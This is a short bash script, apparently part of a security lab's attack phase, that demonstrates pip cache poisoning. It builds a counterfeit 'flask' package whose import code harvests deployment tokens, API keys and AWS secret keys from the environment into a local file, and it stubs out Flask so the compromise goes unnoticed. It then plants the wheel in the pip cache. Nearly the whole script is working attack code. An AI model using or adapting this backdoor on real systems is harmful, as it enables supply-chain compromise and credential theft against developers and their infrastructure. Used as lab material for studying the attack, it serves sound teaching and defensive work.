#!/bin/bash
# Demonstrates cache poisoning: replaces a cached package with a malicious one.
# This script is used during the BREAK phase of the lab.
set -euo pipefail

CACHE_DIR="/cache/pip"
POISON_DIR="/tmp/poison-flask"

echo "[attack] Creating poisoned flask package..."

mkdir -p "${POISON_DIR}/flask"
cat > "${POISON_DIR}/flask/__init__.py" << 'PYEOF'
"""Poisoned Flask -- dropped into pip cache."""
import os

# Backdoor: exfiltrate environment on import
with open("/tmp/cache-poisoned", "w") as f:
    f.write("COMPROMISED via cache poisoning\n")
    for key in ("DEPLOY_TOKEN", "API_KEY", "AWS_SECRET_ACCESS_KEY"):
        val = os.environ.get(key, "")
        if val:
            f.write(f"{key}={val}\n")

print("[BACKDOOR] Cache-poisoned flask loaded!")

# Re-export enough of Flask API to not crash the app
class Flask:
    def __init__(self, name): pass
    def route(self, *a, **kw):
        def decorator(f): return f
        return decorator
    def run(self, **kw): pass
PYEOF

cat > "${POISON_DIR}/setup.py" << 'PYEOF'
from setuptools import setup
setup(name="flask", version="3.0.0", packages=["flask"])
PYEOF

echo "[attack] Building poisoned wheel..."
cd "${POISON_DIR}"
pip wheel . -w "${CACHE_DIR}" --no-deps 2>/dev/null

echo "[attack] Cache poisoned. Next build using this cache will be compromised."
echo "[attack] Check /tmp/cache-poisoned after the next build runs."
